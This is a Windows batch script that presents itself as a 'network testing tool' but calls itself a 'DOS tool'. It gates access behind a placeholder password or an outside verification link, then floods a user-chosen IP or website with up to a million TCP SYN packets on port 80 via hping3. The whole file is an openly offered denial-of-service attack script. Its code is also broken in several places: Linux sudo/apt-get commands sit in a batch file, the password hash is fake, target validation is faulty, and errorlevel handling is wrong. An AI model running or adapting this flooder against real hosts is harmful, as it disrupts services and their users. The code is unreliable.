@echo off
setlocal

REM ==============================================
REM MPS VMini - Network Testing Tool with hping3
REM ==============================================

REM ASCII Art Title: MPS
echo.
echo.
echo.      __  __ ____  ____  
echo.     |  \/  |  _ \/ ___| 
echo.     | |\/| | |_) \___ \ 
echo.     | |  | |  __/ ___) |
echo.     |_|  |_|_|   |____/ 
echo.
echo.

REM ==============================================
REM Password Protection or Link Verification
REM ==============================================

set "password_hash=abc123hash"  REM Placeholder for hashed password
set "verificationLink=https://onbit.pro/Verifymps"

:VerificationMenu
echo Choose a verification method:
echo 1. Password
echo 2. Link Verification
set /p choice=Enter your choice (1 or 2): 

if "%choice%"=="1" goto PasswordVerification
if "%choice%"=="2" goto LinkVerification
echo Invalid choice. Please try again.
goto VerificationMenu

:PasswordVerification
set /p userpass=Enter the password to continue: 

REM Simple hash check (in real scenario, hash comparison would be more secure)
call :hash_password "%userpass%" userpass_hash
if "%userpass_hash%" neq "%password_hash%" (
    echo Incorrect password. Exiting...
    pause
    exit /b
)
goto VerificationSuccess

:LinkVerification
echo Please visit the following link to verify your access:
echo %verificationLink%
echo After verification, return here and press any key to continue.
pause >nul
goto VerificationSuccess

:VerificationSuccess
echo Verification successful! You now have access to the DOS tool.

REM ==============================================
REM Check if hping3 is installed
REM ==============================================

where hping3 >nul 2>&1
if %errorlevel% equ 0 (
    goto StartScript
) else (
    echo hping3 is not installed.
    echo Do you want to install hping3? (Y/N)
    set /p installChoice=Enter your choice (Y/N): 

    if /i "%installChoice%"=="Y" (
        call :InstallHping3
        if %errorlevel% equ 0 (
            echo hping3 was installed successfully.
            goto StartScript
        ) else (
            echo Failed to install hping3. Please install it manually and rerun the script.
            pause
            exit /b
        )
    ) else (
        echo hping3 is required to continue. Exiting...
        pause
        exit /b
    )
)

:InstallHping3
REM Check the operating system to decide how to install hping3
REM Assuming the user is on a Unix-like system (Linux)
echo Installing hping3...
REM The below command works for Linux-based systems like Ubuntu/Debian. Modify accordingly for other distributions.
REM Check for an operating system using environment variables, e.g., %OS% or other methods.

if exist "%ProgramFiles%\Cygwin" (
    REM If Cygwin is present (for Windows), install hping3 through Cygwin
    echo Installing hping3 via Cygwin...
    cygwin_setup.exe -q -P hping3
    exit /b
) else (
    REM For Linux or WSL, use apt-get (assumes the script is running in a bash environment)
    echo Installing hping3 via apt-get...
    REM Uncomment the next line for Linux installation via apt-get
    sudo apt-get update && sudo apt-get install -y hping3
    if errorlevel 1 (
        echo Installation failed. Please install hping3 manually.
        exit /b 1
    )
)

exit /b

:StartScript
REM ==============================================
REM Prompt User for Target IP or Website
REM ==============================================

set /p target=Enter the target IP or website: 
call :validate_target "%target%"
if errorlevel 1 (
    echo Invalid target specified. Exiting...
    pause
    exit /b
)

REM Set the number of packets to send
set /p packets=Enter the number of packets to send (default is 1000, max is 1000000): 
if "%packets%"=="" set packets=1000
call :validate_packets "%packets%"
if errorlevel 1 (
    echo Invalid packet count. Exiting...
    pause
    exit /b
)

REM ==============================================
REM Initialize Stats
REM ==============================================

set "statsFile=%temp%\stats.txt"
echo Connection Stats > "%statsFile%"
echo ----------------- >> "%statsFile%"
echo Packets Sent: 0 >> "%statsFile%"
echo Data Sent: 0 MB (0 GB) >> "%statsFile%"
start notepad "%statsFile%"

REM ==============================================
REM Sending TCP Packets Using hping3
REM ==============================================

echo Starting %packets% TCP packets to %target%...
echo Press Ctrl+C to stop at any time.

set /a packetCount=0
set /a dataSent=0

REM Use hping3 to send TCP packets (SYN packets) on port 80
for /L %%a in (1,1,%packets%) do (
    hping3 -S -p 80 %target% >nul
    if %errorlevel% equ 0 (
        echo Successfully sent packet to %target% (Packet %%a)
    ) else (
        echo Failed to send packet to %target% (Packet %%a)
    )
    set /a packetCount+=1
    set /a dataSent+=60  REM Assuming each packet is approximately 60 bytes (for TCP/IP overhead)
    set /a dataSentMB=dataSent/1048576
    set /a dataSentGB=dataSent/1073741824
    echo Packets Sent: %packetCount% > "%statsFile%"
    echo Data Sent: %dataSentMB% MB (%dataSentGB% GB) >> "%statsFile%"
)

echo All packets sent to %target%!
pause

REM Clean up the stats file after completion
del "%statsFile%"
exit /b

:hash_password
REM Example of simple hash, replace with a secure method
setlocal
set "input=%~1"
set "hash="
for %%A in (%input%) do (
    set "hash=%%A"  REM A simple "hash" method for demonstration
)
endlocal & set "%~2=%hash%"
exit /b

:validate_target
REM Validate if the target is a valid IP or website format
set "target=%~1"
echo %target% | findstr /R "^https\?://.*" >nul
if errorlevel 1 (
    echo Invalid target URL/IP format.
    exit /b 1
)
exit /b

:validate_packets
REM Ensure packet count is a number and within limits
set "packets=%~1"
for /f "delims=" %%A in ('echo %packets%') do set /a num=%%A >nul
if %num% lss 1 set errorlevel 1
if %num% gtr 1000000 set errorlevel 1
exit /b
